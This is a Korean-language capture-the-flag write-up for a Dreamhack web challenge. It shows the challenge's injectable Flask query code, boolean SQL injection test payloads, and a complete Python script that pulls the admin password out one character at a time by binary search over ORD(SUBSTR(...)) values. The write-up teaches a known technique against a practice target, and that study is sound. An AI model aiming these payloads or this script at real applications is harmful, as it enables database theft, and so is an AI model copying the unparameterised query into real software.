created: 2026-01-25 10:31
category: #web 
link: https://dreamhack.io/wargame/challenges/411

# Write-up
```python
template ='''
<pre style="font-size:200%">SELECT * FROM users WHERE uid='{{uid}}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
{% if nrows == 1%}
    <pre style="font-size:150%">user "{{uid}}" exists.</pre>
{% endif %}
'''

@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")

    return render_template_string(template, uid=uid, nrows=nrows)
```
- 일단 메인 함수의 코드인데, 어떠한 필터링도 없어서 SQL injection을 시도하기 쉽다고 생각했다.
- 하지만 SQL 쿼리문의 결과가 딱히 없고, 알 수 있는건 쿼리 결과의 개수가 1일 때 `user "{{uid}}" exists.`가 출력된다는 것이다.

![[Pasted image 20260126000357.png|700]]
`guest' And '1'='1` 일단 이렇게 쿼리 파라미터를 전송하니 위 이미지와 같은 결과가 나타났다.

![[Pasted image 20260126000443.png|700]]
`guest' AND '1'='2` 로 하면 `nrows`의 값이 0이 될테니 따로 나타나는 게 없었다. 

위의 결과로 보면
- SQL injection은 잘 통한다.
- injection한 쿼리의 참/거짓을 판별할 수 있다. 

> **관리자의 비밀번호는 "아스키코드"와 "한글"로 구성되어 있습니다.**
- 문제 설명은 위와 같다. 관리자의 `uid`는 "admin"이다. 참/거짓을 판별할 수 있으니 관리자 비밀번호 한 글자 한 글자씩 한글과 아스키코드로 비교하면서 브루트 포스 방식으로 알아낼 수 있을 것 같았다. 
- OAST 방식으로도 풀 수 있을 것 같았지만 좀 더 난이도가 있는 것 같아서 일단 직관적인 브루트 포스 방법으로 해결하려고 했다.

아스키 코드는 0부터 127까지 인 것으로 알고 있다. 그래서 큰 문제가 안되었지만 한글의 모든 글자 수는 총 11,172가 된다. 그래서 이 조합을 모두 브루트 포스로 검사하게 되면 좀 느릴 것 같았다. 
따라서 **이진 탐색**을 생각하게 되었다. 

먼저 MySQL에는 `ORD`라는 문자열의 아스키 코드 값을 반환하는 함수가 있다. 한글과 같은 멀티 바이트 문자열을 넣으면 특정한 알고리즘을 통해서 값을 산출하게 된다.

![[Pasted image 20260127175432.png]]
위 이미지와 같이 한글의 가장 마지막 글자인 "힣"을 넣어서 `ORD` 함수를 실행하면 15572643이 나온다. 따라서 단순하게 생각해봐도 0부터 15572643까지 범위부터 이진 탐색을 하면 금방 플래그 값을 획득할 수 있을 것 같았다. 

다음과 같은 절차를 세웠다.
1. 'admin'의 `upw` 값을 SUBSTRING을 통해서 한 글자씩 뽑는다. 
2. 해당 한 글자를 `ORD` 함수에 넣는다. 
3. 위 과정과 함께 이진 탐색 알고리즘을 수행하여 결과가 참이 되는 경우를 찾는다. 
4. 결과가 참이 되는 케이스를 한글로 바꾸거나 아스키 코드 문자로 바꾼다. 
5. 위 과정을 "}" 문자가 발견될 때까지 반복한다.

```python
import requests

# 환경에 맞게 수정
URL = "http://localhost:8000"
# URL = "http://host3.dreamhack.games:9047"
TARGET_COLUMN = "upw"
TARGET_TABLE = "users"
WHERE_CLAUSE = "uid='admin'"


def make_query(pos, mid):
    # ORD(SUBSTR(..., pos, 1))를 이용해 특정 위치의 문자가 mid보다 큰지 확인
    payload = f"admin' AND ORD(SUBSTR((SELECT {TARGET_COLUMN} FROM {TARGET_TABLE} WHERE {WHERE_CLAUSE}), {pos}, 1)) > {mid} -- "
    return payload


def solve():
    password = ""

    i = 0
    is_finished = False
    while not is_finished:
        low = 1  # 최소값 (ASCII 1)
        high = 15572643  # 최대값 ('힣'의 ORD 값)

        i += 1

        # binary search
        while low <= high:
            mid = (low + high) // 2

            # HTTP 요청 보내기 (환경에 따라 params 혹은 data 사용)
            params = {"uid": make_query(i, mid)}
            res = requests.get(URL, params=params)

            # 성공 조건, mid 값보다 큰 경우
            if 'user "admin' in res.text:
                low = mid + 1
            else:
                high = mid - 1

        # 탐색이 끝난 후 low 값이 해당 문자의 ORD 값이 됨
        # 숫자를 다시 한글 문자로 변환
        char_hex = hex(low)[2:]
        try:
            char = bytearray.fromhex(char_hex).decode("utf-8")
            password += char
            print(f"{i}번째 글자 발견: {char}")
        except:
            # 한글이 아닌 일반 ASCII 문자 처리
            char = chr(low)
            password += char
            print(f"{i}번째 글자 발견: {char}")
        if "}" in password:
            is_finished = True

    print(f"flag: {password}")


if __name__ == "__main__":
    solve()
```
이렇게 이진 탐색을 이용한 exploit 코드를 작성하였고, 플래그를 획득할 수 있었다.

# Reference
- https://namu.wiki/w/%ED%98%84%EB%8C%80%20%ED%95%9C%EA%B8%80%EC%9D%98%20%EB%AA%A8%EB%93%A0%20%EA%B8%80%EC%9E%90
- https://namu.wiki/w/%EC%95%84%EC%8A%A4%ED%82%A4%20%EC%BD%94%EB%93%9C
- https://portswigger.net/web-security/sql-injection/blind
- https://qhrhksgkazz.tistory.com/208
- https://gafani.tistory.com/entry/python3-%ED%95%9C%EA%B8%80-%EB%AA%A8%EB%93%A0-%EA%B8%80%EC%9E%90-%EC%B6%9C%EB%A0%A5%ED%95%98%EA%B8%B0